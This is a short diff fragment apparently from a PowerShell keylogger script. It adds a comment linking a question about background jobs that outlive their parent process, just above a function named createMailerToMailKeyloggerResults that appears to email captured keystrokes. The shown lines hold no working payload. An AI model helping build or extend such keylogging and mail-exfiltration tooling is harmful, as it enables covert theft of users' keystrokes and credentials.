@@ -377,6 +377,7 @@ function findGeoLocation(){
 ### It also checks whether the file exists if not it exits
 ### ATTENTION THIS SCRIPT BLOCK IS KILLED IF PARRENT EXITS!!!!!
 ### TODO USE Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList notepad.exe TO MAKE IT INDEPENDABLE 
+### https://stackoverflow.com/questions/8515359/how-can-i-start-a-background-job-in-powershell-that-outlives-its-parent
 function createMailerToMailKeyloggerResults(){
 	$variableContainingScriptToBeExecutedAsString = '
 function mail($messageBody){
